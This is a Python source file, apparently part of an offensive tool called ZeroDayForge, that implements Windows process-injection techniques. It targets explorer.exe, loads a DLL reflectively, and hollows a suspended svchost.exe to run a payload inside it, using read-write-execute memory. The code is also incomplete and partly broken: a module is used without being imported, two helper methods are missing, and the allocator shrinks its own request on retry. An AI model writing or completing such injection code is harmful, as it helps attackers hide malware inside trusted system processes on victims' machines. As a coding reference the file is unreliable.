import ctypes
import psutil
import logging
from ctypes import wintypes, byref, sizeof, Structure, POINTER

class InjectionError(Exception):
	"""Custom exception for injection failures"""
	pass

class STARTUPINFO(Structure):
	_fields_ = [
		("cb", wintypes.DWORD),
		("lpReserved", wintypes.LPWSTR),
		("lpDesktop", wintypes.LPWSTR),
		("lpTitle", wintypes.LPWSTR),
		("dwX", wintypes.DWORD),
		("dwY", wintypes.DWORD),
		("dwXSize", wintypes.DWORD),
		("dwYSize", wintypes.DWORD),
		("dwXCountChars", wintypes.DWORD),
		("dwYCountChars", wintypes.DWORD),
		("dwFillAttribute", wintypes.DWORD),
		("dwFlags", wintypes.DWORD),
		("wShowWindow", wintypes.WORD),
		("cbReserved2", wintypes.WORD),
		("lpReserved2", wintypes.LPBYTE),
		("hStdInput", wintypes.HANDLE),
		("hStdOutput", wintypes.HANDLE),
		("hStdError", wintypes.HANDLE),
	]

class PROCESS_INFORMATION(Structure):
	_fields_ = [
		("hProcess", wintypes.HANDLE),
		("hThread", wintypes.HANDLE),
		("dwProcessId", wintypes.DWORD),
		("dwThreadId", wintypes.DWORD),
	]

class ProcessInjector:
	def __init__(self, pid=None):
		self.logger = logging.getLogger('ZeroDayForge.Injector')
		self.pid = pid or self._find_target_process()
		self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
		self.ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

	def _find_target_process(self):
		"""Find explorer.exe using psutil"""
		try:
			for proc in psutil.process_iter(['pid', 'name']):
				if proc.info['name'].lower() == 'explorer.exe':
					return proc.info['pid']
			raise InjectionError("No explorer.exe process found")
		except psutil.Error as e:
			raise InjectionError(f"Process search failed: {str(e)}")

	def reflective_dll(self, dll_data):
		"""Reflective DLL injection"""
		try:
			pe = pefile.PE(data=dll_data)
			size = pe.OPTIONAL_HEADER.SizeOfImage
			base_addr = self._alloc_mem(size)
			self._map_pe_sections(pe, base_addr)
			return base_addr
		except Exception as e:
			self.logger.error(f"Reflective DLL failed: {str(e)}")
			raise InjectionError("Reflective injection failed")

	def hollow_process(self, payload, target_exe="C:\\Windows\\System32\\svchost.exe"):
		"""Process hollowing implementation"""
		try:
			si = STARTUPINFO()
			si.cb = sizeof(si)
			pi = PROCESS_INFORMATION()
			
			if not self.kernel32.CreateProcessW(
				target_exe, None, None, None, False,
				0x4, None, None, byref(si), byref(pi)
			):
				raise ctypes.WinError()
				
			if not self._unmap_and_inject(pi.hProcess, payload):
				raise InjectionError("Memory injection failed")
				
			self.kernel32.ResumeThread(pi.hThread)
			return pi.dwProcessId
		except Exception as e:
			self.logger.error(f"Hollowing failed: {str(e)}")
			raise InjectionError("Process hollowing failed")

	def _alloc_mem(self, size, retries=3):
		"""Robust RWX memory allocation"""
		for attempt in range(retries):
			addr = self.kernel32.VirtualAlloc(
				0, size, 0x3000, 0x40)  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
			if addr:
				return addr
			size = size // 2
		raise InjectionError("Memory allocation failed after retries")